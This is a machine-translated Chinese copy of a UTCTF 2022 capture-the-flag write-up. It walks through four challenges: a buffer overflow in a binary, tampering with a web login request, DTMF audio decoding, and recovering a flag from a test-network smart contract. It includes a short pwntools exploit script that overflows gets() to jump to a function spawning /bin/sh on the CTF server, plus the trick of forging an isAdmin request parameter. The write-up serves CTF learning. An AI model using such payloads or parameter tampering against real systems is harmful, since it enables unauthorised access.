<html>
<head>
<title>UTCTF 2022 — Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">UTCTF 2022 —详细报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/utctf-2022-writeup-de956bfe0bf3?source=collection_archive---------2-----------------------#2022-03-14">https://infosecwriteups.com/utctf-2022-writeup-de956bfe0bf3?source=collection_archive---------2-----------------------#2022-03-14</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/47910b6d7a210fb19748f9d219bfc0e3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*mBmQ6M7btwPF-qdh.png"/></div></div></figure><p id="c4ae" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我在UTCTF中参加了一些挑战，所以我想分享一下这些挑战的记录。</p><ol class=""><li id="bc3e" class="kz la it kd b ke kf ki kj km lb kq lc ku ld ky le lf lg lh bi translated"><strong class="kd iu">跳来跳去</strong></li></ol><figure class="lj lk ll lm gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi li"><img src="../Images/6a7ff31d827d60d9f990f9df55be0dfa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Zl2tkXrCdNBji15qtUK6lg.png"/></div></div></figure><p id="f858" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">这是基于缓冲区溢出攻击的初学者挑战。</p><p id="797d" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们有二进制文件。为了分析它，我们可以使用像<a class="ae ln" href="https://ghidra-sre.org/" rel="noopener ugc nofollow" target="_blank">吉德拉</a>或<a class="ae ln" href="https://hex-rays.com/ida-pro/" rel="noopener ugc nofollow" target="_blank">艾达</a>这样的软件。我曾经使用ghidra并通过反编译器查看函数。</p><p id="8419" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们有主函数，它不提供更多的信息，从用户的输入看起来更直接。</p><figure class="lj lk ll lm gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi lo"><img src="../Images/b79a38bd4e43136245e40c35d8441f3f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZalufILzeHW68jxTSTzkBw.png"/></div></div></figure><p id="ca6f" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">当我观察二进制文件中可用的函数时。我发现“get_flag”函数可疑。</p><figure class="lj lk ll lm gt ju gh gi paragraph-image"><div class="gh gi lp"><img src="../Images/da13065875bd514d2d7e2c47837ed258.png" data-original-src="https://miro.medium.com/v2/resize:fit:912/format:webp/1*tDNZ1d1EfNWrIMVijTf81Q.png"/></div></figure><p id="4a63" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">所以，它基本上是用'/bin/sh '调用系统函数。这是一个漏洞，它会让我们通过外壳访问服务器。</p><figure class="lj lk ll lm gt ju gh gi paragraph-image"><div class="gh gi lq"><img src="../Images/8e47ac4f1231010e97e760e013790761.png" data-original-src="https://miro.medium.com/v2/resize:fit:1350/format:webp/1*sZ2TWxjYbz1s4u_bGCz9nw.png"/></div></figure><p id="261a" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们知道gets()函数容易受到缓冲区溢出攻击，我们可以利用它。我写了一个脚本来获得交互式shell。</p><pre class="lj lk ll lm gt lr ls lt lu aw lv bi"><span id="4fd1" class="lw lx it ls b gy ly lz l ma mb">from pwn import *<br/>r = remote('pwn.utctf.live', 5001)<br/>r.recvuntil('drill')<br/>e = elf.ELF('./jump')<br/>payload = b'a'*120 + p64(e.symbols['get_flag']) + b'\n'<br/>r.sendline(payload)<br/>r.interactive()</span></pre><p id="b0bb" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们用两件事创建一个有效载荷，一是我们溢出缓冲区来修改rsp地址，在gets()函数执行后，它将指向下一个地址。所以，我们必须跳转到get_flag()函数来获取shell。我们知道缓冲区大小是112。由于是64位二进制，112+8会溢出rbp(基址指针)，接下来是rsp(堆栈指针)。我们用get_flag()函数地址的地址写rsp寄存器。然后，我们将这个有效载荷发送到服务器。</p><figure class="lj lk ll lm gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mc"><img src="../Images/903f870495aa6329e240b52dcb21ee02.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*53agZ4NbkFRBFc-xjrfE0g.png"/></div></div></figure><p id="02e8" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">所以最后我们得到了shell，并为flag创建了“flag.txt”文件。</p><p id="fdcb" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"><strong class="kd iu"> 2。作为管理员Pt 3 </strong>登录</p><figure class="lj lk ll lm gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi md"><img src="../Images/bd3d799fb3ff6c62668f2f1d16f0c2a4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Iv8SleSx0ktxGWFbq3ZBnw.png"/></div></div></figure><p id="26c0" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">这是另一个基于web漏洞的初学者挑战。他们给了我们两样东西</p><ol class=""><li id="d237" class="kz la it kd b ke kf ki kj km lb kq lc ku ld ky le lf lg lh bi translated">链接到易受攻击的网站</li><li id="e294" class="kz la it kd b ke me ki mf km mg kq mh ku mi ky le lf lg lh bi translated">服务器python代码</li></ol><p id="4a3b" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">当我分析服务器代码时。我发现用户名和密码是“admin”。</p><figure class="lj lk ll lm gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mj"><img src="../Images/e383a8bb034dd0fe4ff594f23e90ec51.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*e2QstttBlmZXGHlq3yFYQQ.png"/></div></div></figure><p id="e389" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们已经通过这是登录页面。但是在传递之后，我们得到了错误。</p><figure class="lj lk ll lm gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mk"><img src="../Images/0c1fb1d0a6e03f32229bc5d6e7218b27.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ARfFb6gpCGJjhaYmgW5vMQ.png"/></div></div></figure><p id="ef5b" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">如果我们再次观察服务器代码，会发现请求了三个有效负载</p><ol class=""><li id="057e" class="kz la it kd b ke kf ki kj km lb kq lc ku ld ky le lf lg lh bi translated">用户名</li><li id="8378" class="kz la it kd b ke me ki mf km mg kq mh ku mi ky le lf lg lh bi translated">显示当前工作目录</li><li id="5f00" class="kz la it kd b ke me ki mf km mg kq mh ku mi ky le lf lg lh bi translated">isAdmin</li></ol><p id="276d" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">但是当我们通过浏览器中的inspect元素检查发送到服务器的数据包时。仅发送用户名和密码。</p><figure class="lj lk ll lm gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ml"><img src="../Images/ac2a8b83b8393990eb8e081a954e292f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IEXHAhfKISHmUAkmR9yDww.png"/></div></div></figure><p id="294f" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">所以我们必须重写请求参数并将其发送到服务器。我们在“网络”标签中有“编辑并发送”选项。</p><figure class="lj lk ll lm gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mm"><img src="../Images/d24151c26a21d9b585fef6cd6dcabc81.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YYVdluWdyJQUxKV0eTBz0g.png"/></div></div></figure><p id="2be9" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">在发送这个请求之后，我们得到这个标志作为我们的响应。</p><figure class="lj lk ll lm gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mn"><img src="../Images/ac0af7b563066f5dd135aea798bc1e4f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TrBiB5Ki6mgG7kQ9VH9Iig.png"/></div></div></figure><p id="ce43" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"><strong class="kd iu"> 3。听起来很熟悉</strong></p><figure class="lj lk ll lm gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mo"><img src="../Images/86d20ba515a3b49924a2719acb5bcfff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YN1ArsJ1tkJK5iKsRraSQA.png"/></div></div></figure><p id="3dcd" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">这是一个基于分析wav文件并找到其中隐藏信息的取证挑战。</p><p id="5d52" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">当我打开wav文件时，我明白这是手机键盘的声音。于是我就用<a class="ae ln" href="https://unframework.github.io/dtmf-detect/" rel="noopener ugc nofollow" target="_blank">这个</a>网站来解码音调。</p><p id="9134" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">当我放下“超级奇怪”的wav文件并播放它时。它给了我解码的数字。</p><pre class="lj lk ll lm gt lr ls lt lu aw lv bi"><span id="73bc" class="lw lx it ls b gy ly lz l ma mb"><strong class="ls iu">100888210610071905578878610699109864888508912081681081029071571029810957488812286111817274108102816161</strong></span></pre><p id="5622" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">此外，每次两三位数之间都有间隔，所以我把它们分开了。后来我观察到它们是字符的ascii值。做了一个小python代码来转换。</p><figure class="lj lk ll lm gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mp"><img src="../Images/551f155ed3aa140cd72ca17ff9369aea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jAOkSo7y2l5VksQ8z0S6wA.png"/></div></div></figure><figure class="lj lk ll lm gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mq"><img src="../Images/925c62381b86e41b4547c9165071d1bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*C2QCzrpBbdpIHw017w8KQQ.png"/></div></div></figure><p id="a16b" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">运行程序后，我得到了一个base64编码的字符串。解码给了我旗子。</p><figure class="lj lk ll lm gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mr"><img src="../Images/1c99efe6f7d3aa607611ea4df5d21610.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IyeCs-PQLd59rJ3frAOnmQ.png"/></div></div></figure><p id="fda2" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">4.<strong class="kd iu">脾气暴躁的精灵</strong></p><figure class="lj lk ll lm gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ms"><img src="../Images/c415ccfeb800419dfe5c26ab3c6045e3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8GfJG4Lnau70gkTtn5UmWA.png"/></div></div></figure><p id="a095" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">这是一个基于智能合约的杂项挑战。他们给了我们智能合约地址和粘贴箱中的智能合约。</p><p id="8865" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们可以通过<a class="ae ln" href="https://ropsten.etherscan.io/" rel="noopener ugc nofollow" target="_blank">以太网扫描</a>查看智能合同的详细信息，它会告诉您有关智能合同创建和地址间交易的详细信息。</p><p id="4cc5" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">该智能合同已在Ropsten测试网络中部署。所以我们必须在etherscan中选择Ropsten网络并搜索地址。</p><p id="af4a" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"><a class="ae ln" href="https://ropsten.etherscan.io/address/0x867D66C78235CD6c989FbFA34606FcfF637fB613" rel="noopener ugc nofollow" target="_blank">https://ropsten . ethers can . io/address/0x 867d 66 c 78235 CD 6 c 989 fbfa 34606 fcff 637 FB 613</a></p><p id="8488" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们可以看到已经发生了几笔交易，但我们对合同创建感兴趣。</p><figure class="lj lk ll lm gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mt"><img src="../Images/2c670a2163b9d6461ab1ea68e268b8e6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-uIGEDzkVXqGaP9keEazLw.png"/></div></div></figure><p id="4669" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">当我们更详细地检查交易时。</p><figure class="lj lk ll lm gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mu"><img src="../Images/9fc43892f64a7b7229e81087f2b52605.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FgFbyMZTWSGnkI0vudVPBg.png"/></div></div></figure><p id="7eab" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们可以在输入数据部分看到编码为UTF-8的标志。</p><p id="6831" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">此外，为了了解更多关于智能合同的信息，我们查看了<a class="ae ln" href="https://pastebin.com/T7r9vFvg" rel="noopener ugc nofollow" target="_blank"> pastebin </a>，其中包含了更多关于已部署智能合同的信息。</p><p id="cbdd" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">演奏这首CTF很有趣。希望你学到了新东西。</p><p id="4ac4" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">阅读我的其他文章。</p><p id="78cb" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">网址:<a class="ae ln" href="https://vishnuram1999.github.io/" rel="noopener ugc nofollow" target="_blank">https://vishnuram1999.github.io/</a></p><p id="5560" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">更多其他文章请关注我。</p></div></div>    
</body>
</html>